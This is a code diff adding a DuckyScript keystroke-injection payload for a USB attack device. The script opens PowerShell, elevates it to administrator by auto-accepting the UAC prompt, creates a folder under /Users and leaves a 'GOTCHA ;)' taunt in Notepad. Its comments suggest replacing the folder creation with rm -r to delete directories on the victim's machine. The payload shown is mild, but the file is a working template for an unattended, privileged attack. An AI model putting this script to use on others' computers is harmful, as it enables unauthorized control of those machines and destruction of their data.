@@ -1,0 +1,39 @@
+REM DuckyScript by Github User: hannah-ashna
+REM Open up powershell via Windows Key + R
+DELAY 750
+GUI r
+DELAY 1000
+STRING powershell 
+ENTER
+
+REM We need Administrator access in order to modify certain files
+REM Hence we use -Verb runAs to elevate powershell
+DELAY 700
+STRING Start-Process Powershell -Verb runAs
+ENTER
+DELAY 700
+ALT y
+
+REM Now it's time to decide where you want to go and what you want to do
+REM In this example, we're going to go to the /Users directory and create a new folder
+REM This folder is called TacoTuesday ... quite harmless.
+REM Alternatively, you can instead use rm -r "directory name" to delete a directory entirely
+DELAY 500
+STRING cd /Users
+ENTER
+DELAY 100
+STRING mkdir TacoTuesday
+ENTER
+DELAY 400
+STRING exit
+ENTER
+
+REM Once the deed is done go ahead and leave them a nice little message
+DELAY 750
+GUI r
+DELAY 1000
+STRING notepad
+ENTER
+DELAY 700
+STRING GOTCHA ;)
+ENTER
